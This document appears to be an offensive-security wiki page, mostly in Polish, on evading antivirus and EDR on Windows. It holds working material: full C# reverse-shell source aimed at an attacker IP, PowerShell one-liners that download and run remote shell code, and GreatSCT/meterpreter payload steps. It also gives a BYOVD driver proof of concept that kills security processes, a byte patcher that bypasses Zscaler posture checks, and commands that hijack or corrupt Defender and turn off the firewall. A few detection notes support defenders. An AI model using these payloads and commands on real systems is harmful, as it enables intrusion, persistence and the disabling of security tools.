PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to potężny mechanizm logowania w Windows, który pozwala aplikacjom i komponentom systemowym na **logowanie zdarzeń**. Może być jednak także używany przez rozwiązania zabezpieczające do monitorowania i wykrywania złośliwej aktywności.

Podobnie jak w przypadku wyłączania (obejścia) AMSI, możliwe jest również sprawienie, żeby funkcja przestrzeni użytkownika **`EtwEventWrite`** zwracała od razu kontrolę bez logowania zdarzeń. Robi się to poprzez załatanie (patch) funkcji w pamięci tak, aby od razu zwracała, skutecznie wyłączając logowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Ładowanie binarek C# do pamięci jest znane od dawna i nadal jest świetnym sposobem uruchamiania narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci bez zapisu na dysk, musimy się jedynie martwić o patchowanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) już oferuje możliwość wykonywania assembly C# bezpośrednio w pamięci, ale istnieją różne sposoby robienia tego:

- **Fork\&Run**

Polega na **utworzeniu nowego procesua poświęconego (sacrificial process)**, wstrzyknięciu do tego procesu złośliwego kodu post-exploitation, wykonaniu go, a następnie zabiciu tego procesu po zakończeniu. Ma to swoje zalety i wady. Zaletą metody fork and run jest to, że wykonanie odbywa się **poza** procesem naszego Beacona. Oznacza to, że jeśli coś pójdzie nie tak lub zostanie wykryte w trakcie działania naszego kodu post-exploitation, istnieje **znacznie większa szansa**, że nasz **implant przetrwa.** Wadą jest to, że mamy **większe ryzyko** wykrycia przez **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Polega na wstrzyknięciu złośliwego kodu post-exploitation **do własnego procesu**. W ten sposób można uniknąć tworzenia nowego procesu i skanowania go przez AV, ale wadą jest to, że jeśli coś pójdzie nie tak z wykonaniem payloadu, istnieje **duże prawdopodobieństwo** utraty naszego Beacona, ponieważ proces może się zrestartować lub zawiesić.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz też ładować Assemblies C# **z PowerShell**, zobacz [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonywanie złośliwego kodu w innych językach, dając skompromitowanej maszynie dostęp **do środowiska interpretera zainstalowanego na atakowanym udziale SMB**.

Pozwalając na dostęp do interpreterów i środowiska na udziale SMB, możesz **wykonywać dowolny kod w tych językach w pamięci** skompromitowanej maszyny.

Repozytorium wskazuje: Defender nadal skanuje skrypty, ale wykorzystując Go, Java, PHP itd. mamy **więcej elastyczności, by ominąć statyczne sygnatury**. Testy z losowymi, nieobfuskowanymi reverse shellami w tych językach dały pozytywne wyniki.

## TokenStomping

Token stomping to technika pozwalająca atakującemu **manipulować tokenem dostępu lub produktem zabezpieczającym jak EDR czy AV**, pozwalając na zmniejszenie jego uprawnień tak, że proces nie zostanie zabity, ale nie będzie miał uprawnień do sprawdzania złośliwej aktywności.

Aby zapobiec temu, Windows mógłby **uniemożliwić zewnętrznym procesom** uzyskiwanie uchwytów do tokenów procesów zabezpieczeń.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Jak opisano w [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest po prostu wdrożyć Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia i utrzymania dostępu:
1. Pobierz ze strony https://remotedesktop.google.com/, kliknij "Set up via SSH", a następnie kliknij plik MSI dla Windows, aby pobrać instalator MSI.
2. Uruchom instalator cicho na maszynie ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć do strony Chrome Remote Desktop i kliknij dalej. Kreator poprosi Cię o autoryzację; kliknij przycisk Authorize, aby kontynuować.
4. Wykonaj podany parametr z pewnymi poprawkami: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Zwróć uwagę na parametr pin, który pozwala ustawić PIN bez użycia GUI).


## Advanced Evasion

Evasion to bardzo skomplikowany temat — czasami musisz uwzględnić wiele różnych źródeł telemetrii w jednym systemie, więc praktycznie niemożliwe jest pozostanie całkowicie niewykrytym w dojrzałych środowiskach.

Każde środowisko, przeciwko któremu działasz, będzie miało swoje mocne i słabe strony.

Gorąco zachęcam do obejrzenia tego wystąpienia od [@ATTL4S](https://twitter.com/DaniLJ94), aby uzyskać wgląd w bardziej zaawansowane techniki Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To także inne świetne wystąpienie od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), które będzie **usuwać części binarki** aż **zidentyfikuje, którą część Defender** uznaje za złośliwą i rozdzieli to dla Ciebie.\
Inne narzędzie robiące to samo to [**avred**](https://github.com/dobin/avred) z otwartą usługą dostępną pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows 10 włącznie, wszystkie wersje Windows miały **Telnet server**, który można było zainstalować (jako administrator) wykonując:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Spraw, aby to **uruchamiało się** przy starcie systemu i **uruchom** je teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień telnet port** (stealth) i wyłącz firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pobierz z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (pobierz bin, nie setup)

**ON THE HOST**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś binarkę _**winvnc.exe**_ i **nowo** utworzony plik _**UltraVNC.ini**_ na **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UWAGA:** Aby zachować stealth, nie rób następujących rzeczy

- Nie uruchamiaj `winvnc` jeśli jest już uruchomiony, bo wywoła to [popup](https://i.imgur.com/1SROTTl.png). Sprawdź czy jest uruchomiony poleceniem `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez `UltraVNC.ini` w tym samym katalogu, bo spowoduje to otwarcie [the config window](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h` żeby zobaczyć pomoc, bo wywoła to [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Wewnątrz GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **uruchom lister** przy użyciu `msfconsole -r file.rc` i **wykonaj** **xml payload** za pomocą:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Obecny Defender zakończy proces bardzo szybko.**

### Kompilowanie naszego własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj to za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj tego z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# — użycie kompilatora
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i uruchomienie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/promheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia python do tworzenia injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Zabijanie AV/EDR z poziomu przestrzeni jądra

Storm-2603 użyło małego narzędzia konsolowego znanego jako **Antivirus Terminator**, aby wyłączyć zabezpieczenia endpoint przed zrzuceniem ransomware. Narzędzie dostarcza własny podatny, ale *podpisany* sterownik i wykorzystuje go do wykonywania uprzywilejowanych operacji w jądrze, których nawet usługi AV uruchomione jako Protected-Process-Light (PPL) nie mogą zablokować.

Kluczowe wnioski
1. **Podpisany sterownik**: Plik zapisany na dysku to `ServiceMouse.sys`, ale binarka to legalnie podpisany sterownik `AToolsKrnl64.sys` z “System In-Depth Analysis Toolkit” Antiy Labs. Ponieważ sterownik ma ważny podpis Microsoft, ładuje się nawet gdy Driver-Signature-Enforcement (DSE) jest włączone.
2. **Instalacja usługi**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Pierwsza linia rejestruje sterownik jako usługę **kernel**, a druga ją uruchamia, dzięki czemu `\\.\ServiceMouse` staje się dostępny z poziomu user land.
3. **IOCTLy udostępnione przez sterownik**
| IOCTL code | Możliwość                              |
|-----------:|----------------------------------------|
| `0x99000050` | Zakończenie dowolnego procesu po PID (używane do zabijania usług Defender/EDR) |
| `0x990000D0` | Usunięcie dowolnego pliku na dysku |
| `0x990001D0` | Odładowanie sterownika i usunięcie usługi |

Minimalny proof-of-concept w C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Dlaczego to działa**: BYOVD omija całkowicie ochrony w trybie użytkownika; kod wykonujący się w jądrze może otwierać *chronione* procesy, kończyć je lub manipulować obiektami jądra niezależnie od PPL/PP, ELAM czy innych mechanizmów hardeningu.

Wykrywanie / Mitigacja
•  Włącz listę blokowanych podatnych sterowników Microsoft (`HVCI`, `Smart App Control`), aby Windows odmawiał załadowania `AToolsKrnl64.sys`.  
•  Monitoruj tworzenie nowych usług *kernel* i generuj alert, gdy sterownik jest ładowany z katalogu zapisywalnego przez wszystkich lub nie znajduje się na liście dozwolonych.  
•  Obserwuj uchwyty w trybie użytkownika do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Omijanie kontroli postawy Zscaler Client Connector poprzez patchowanie binarek na dysku

Zscaler’s **Client Connector** stosuje reguły postawy urządzenia lokalnie i korzysta z Windows RPC do komunikowania wyników innym komponentom. Dwa słabe wybory projektowe umożliwiają pełne obejście:

1. Ocena postawy odbywa się **całkowicie po stronie klienta** (na serwer wysyłany jest tylko boolean).  
2. Wewnętrzne endpointy RPC sprawdzają jedynie, że łączący się plik wykonywalny jest **podpisany przez Zscaler** (poprzez `WinVerifyTrust`).

Poprzez **patchowanie czterech podpisanych binarek na dysku** oba mechanizmy można zneutralizować:

| Binary | Oryginalna logika zmieniona | Efekt |
|--------|-----------------------------|--------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola przechodzi |
| `ZSAService.exe` | Pośrednie wywołanie `WinVerifyTrust` | Zastąpione NOP-ami ⇒ dowolny (nawet niepodpisany) proces może połączyć się z pipe'ami RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Kontrole integralności tunelu | Pominięte |

Minimalny fragment patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **All** posture checks display **green/compliant**.
* Niesygnowane lub zmodyfikowane binaria mogą otwierać punkty końcowe RPC nazwanych potoków (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitowany host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez polityki Zscaler.

To studium przypadku pokazuje, jak czysto klienckie decyzje zaufania i proste sprawdzanie podpisu można obejść za pomocą kilku modyfikacji bajtów.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) wymusza hierarchię podpisujących i poziomów, tak że tylko procesy chronione o równym lub wyższym poziomie mogą wzajemnie ingerować. W ataku, jeśli możesz prawidłowo uruchomić binarium z włączonym PPL i kontrolować jego argumenty, możesz przekształcić nieszkodliwą funkcjonalność (np. logowanie) w ograniczony prymityw zapisu wspierany przez PPL przeciw katalogom chronionym używanym przez AV/EDR.

What makes a process run as PPL
- Docelowy EXE (i wszelkie załadowane DLL) musi być podpisany przy użyciu EKU umożliwiającego PPL.
- Proces musi zostać utworzony przy użyciu CreateProcess z flagami: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać kompatybilnego poziomu ochrony, który odpowiada podpisującemu binarium (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla podpisujących anti-malware, `PROTECTION_LEVEL_WINDOWS` dla podpisujących Windows). Błędne poziomy spowodują niepowodzenie tworzenia.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Otwartoźródłowe narzędzie pomocnicze: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Wzorzec użycia:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Prymityw LOLBIN: ClipUp.exe
- Podpisany systemowy plik binarny `C:\Windows\System32\ClipUp.exe` uruchamia się sam i przyjmuje parametr określający ścieżkę zapisu pliku logu.
- Po uruchomieniu jako proces PPL zapis pliku odbywa się z uprawnieniami PPL.
- ClipUp nie potrafi parsować ścieżek zawierających spacje; użyj 8.3 short paths, aby wskazać normalnie chronione lokalizacje.

8.3 short path helpers
- Wyświetl krótkie nazwy: `dir /x` w każdym katalogu nadrzędnym.
- Ustal krótką ścieżkę w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Uruchom LOLBIN obsługujący PPL (ClipUp) z `CREATE_PROTECTED_PROCESS` używając launchera (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki logu ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). Użyj 8.3 short names, jeśli potrzeba.
3) Jeśli docelowy plik binarny jest normalnie otwarty/zablokowany przez AV podczas działania (np. MsMpEng.exe), zaplanuj zapis podczas rozruchu przed uruchomieniem AV instalując usługę auto-start, która niezawodnie uruchamia się wcześniej. Zweryfikuj kolejność rozruchu za pomocą Process Monitor (boot logging).
4) Po ponownym uruchomieniu zapis z PPL następuje zanim AV zablokuje swoje binaria, uszkadzając docelowy plik i uniemożliwiając uruchomienie.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Uwagi i ograniczenia
- Nie kontrolujesz zawartości, którą zapisuje ClipUp poza miejscem jej umieszczenia; prymityw nadaje się do korupcji, a nie do precyzyjnego wstrzykiwania treści.
- Wymaga uprawnień lokalnego administratora/SYSTEM do zainstalowania/uruchomienia usługi oraz okna na restart.
- Krytyczne jest wyczucie czasu: cel nie może być otwarty; wykonanie przy uruchamianiu systemu unika blokad plików.

Wykrywanie
- Tworzenie procesu `ClipUp.exe` z nietypowymi argumentami, szczególnie gdy rodzicem procesu jest niestandardowy program uruchamiający, w okolicach rozruchu.
- Nowe usługi skonfigurowane do autostartu podejrzanych binarek i konsekwentnie uruchamiające się przed Defender/AV. Zbadaj tworzenie/modyfikację usług przed błędami uruchamiania Defendera.
- Monitorowanie integralności plików dla binarek Defender/folderów Platform; nieoczekiwane tworzenie/modyfikacja plików przez procesy z flagami protected-process.
- Telemetria ETW/EDR: szukaj procesów utworzonych z `CREATE_PROTECTED_PROCESS` oraz anomalnego użycia poziomów PPL przez binarki niebędące AV.

Środki zaradcze
- WDAC/Code Integrity: ogranicz, które podpisane binarki mogą działać jako PPL i pod jakimi procesami macierzystymi; zablokuj wywołanie ClipUp poza zaufanymi kontekstami.
- Higiena usług: ogranicz tworzenie/modyfikację usług autostartowych i monitoruj manipulacje kolejnością uruchamiania.
- Upewnij się, że Defender tamper protection oraz mechanizmy ochrony uruchamiania wczesnego są włączone; zbadaj błędy startu wskazujące na korupcję binarek.
- Rozważ wyłączenie generowania krótkich nazw 8.3 na woluminach hostujących narzędzia bezpieczeństwa, jeśli jest to zgodne z twoim środowiskiem (dokładnie przetestuj).

Referencje dla PPL i narzędzi
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender wybiera platformę, z której działa, poprzez enumerację podfolderów w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podfolder z najwyższym leksykograficznym stringiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia procesy usługi Defendera stamtąd (odpowiednio aktualizując ścieżki usługi/rejestru). Ten wybór ufa wpisom katalogowym, włączając directory reparse points (symlinks). Administrator może to wykorzystać, przekierowując Defender do ścieżki zapisywalnej przez atakującego i osiągnąć DLL sideloading lub zaburzenie działania usługi.

Wymagania wstępne
- Local Administrator (potrzebny do tworzenia katalogów/symlinks w folderze Platform)
- Możliwość restartu lub wymuszenia re-selekcji platformy Defender (restart usługi przy starcie systemu)
- Wystarczają wbudowane narzędzia (mklink)

Dlaczego to działa
- Defender blokuje zapisy w swoich własnych folderach, ale jego wybór platformy ufa wpisom katalogowym i wybiera najwyższą leksykograficznie wersję bez weryfikacji, czy cel rozwiązuje się do ścieżki chronionej/zaufanej.

Krok po kroku (przykład)
1) Przygotuj zapisywalną kopię bieżącego folderu platform, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz symlink katalogu o wyższej wersji wewnątrz Platform wskazujący na twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór triggera (zalecany restart):
```cmd
shutdown /r /t 0
```
4) Zweryfikuj, że MsMpEng.exe (WinDefend) uruchamia się z przekierowanej ścieżki:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Powinieneś zauważyć nową ścieżkę procesu w `C:\TMP\AV\` oraz konfigurację usługi/rejestru odzwierciedlającą tę lokalizację.

Opcje post-eksploatacyjne
- DLL sideloading/code execution: Upuść/zastąp DLL-e, które Defender ładuje z katalogu aplikacji, aby wykonać kod w procesach Defendera. Zobacz sekcję powyżej: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Usuń version-symlink, tak że przy następnym uruchomieniu skonfigurowana ścieżka nie zostanie rozwiązana i Defender nie uruchomi się:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Zauważ, że ta technika sama w sobie nie zapewnia eskalacji uprawnień; wymaga uprawnień administratora.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teamy mogą przenieść runtime evasion z C2 implant do samego modułu docelowego poprzez hookowanie jego Import Address Table (IAT) i kierowanie wybranych API przez kontrolowany przez atakującego, position‑independent code (PIC). To rozszerza evasion poza wąską powierzchnię API, którą udostępnia wiele kitów (np. CreateProcessA), i stosuje te same zabezpieczenia do BOFs oraz post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
